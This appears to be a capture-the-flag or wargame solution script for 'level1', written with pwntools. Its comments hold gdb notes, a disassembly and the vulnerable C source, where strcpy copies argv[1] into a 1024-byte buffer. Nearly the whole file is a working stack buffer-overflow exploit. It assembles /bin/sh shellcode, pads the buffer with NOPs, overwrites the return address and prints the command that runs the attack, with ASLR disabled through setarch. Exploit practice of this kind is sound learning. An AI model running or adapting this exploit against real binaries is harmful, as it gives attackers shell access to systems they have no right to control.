from pwn import *

# start with:
# setarch `arch` -R ./level1 $(echo -n -e \\x6a..)
# level1@rzt-bin01:/levels$ objdump -f level1

# level1:     file format elf32-i386
# architecture: i386, flags 0x00000112:
# EXEC_P, HAS_SYMS, D_PAGED
# start address 0x08048330

# set disassembly-flavor intel
# disas main
# b *0x080484ae
# r
# x/10xw $ebp
# x/10xw $esp

# 0xbffff788:   0xbffff808  0xb7ea1e16  0x00000002  0xbffff834
# disas 0xb7ea1e16,+100
# buffer location 0xbffff380, 0xbfffef80
# old eip pos   = 0xbffff78c

# int main(int argc, char *argv[])
# {
#     char buf[1024];
#     strcpy(buf, argv[1]);
#     return 0;
# }

   # 0x0804841c <+0>:   push   ebp
   # 0x0804841d <+1>:   mov    ebp,esp
   # 0x0804841f <+3>:   and    esp,0xfffffff0
   # 0x08048422 <+6>:   sub    esp,0x410
   # 0x08048428 <+12>:  mov    eax,DWORD PTR [ebp+0xc]
   # 0x0804842b <+15>:  add    eax,0x4
   # 0x0804842e <+18>:  mov    eax,DWORD PTR [eax]
   # eax holds char* in argv[1]
   # 0x08048430 <+20>:  mov    DWORD PTR [esp+0x4],eax
   # 0x08048434 <+24>:  lea    eax,[esp+0x10]
   # 0x08048438 <+28>:  mov    DWORD PTR [esp],eax
   # [esp] = &buf[0]
   # 0x0804843b <+31>:  call   0x8048300 <strcpy@plt>
   # 0x08048440 <+36>:  mov    eax,0x0
   # 0x08048445 <+41>:  leave
   # 0x08048446 <+42>:  ret

# memory layout once main is called
# buf[1024] | saved_ebp | return_addr | argc | argv * n
#           ^-- ebp     ^-- ebp + 4   ^-- +8 ^-- +12

shell_asm = asm(shellcraft.i386.linux.sh())
print disasm(shell_asm)
shell_hex = enhex(shell_asm)

shell_len = len(shell_hex) / 2

buf_loc    = 0xbfffef80
old_eip_pos = 0xbffff38c
buf_len = old_eip_pos - buf_loc - shell_len
jmp_loc = buf_loc

print 'buf_len: ', buf_len

def hex_str(h):
    return '%.2x%.2x%.2x%.2x' % (((h >> 0) & 0xff), ((h >> 8) & 0xff), ((h >> 16) & 0xff), ((h >> 24) & 0xff))

ex = shell_hex + '90' * buf_len + hex_str(jmp_loc)
# print len(ex), ex

ss = []
for i in range(len(ex)/2):
    ss.append('\\\\x%s' % ex[i*2+0] + ex[i*2+1])

print './level1 $(echo -n -e %s)' % ''.join(ss)
# print ex
# print len(shell_hex)
# print shell_hex
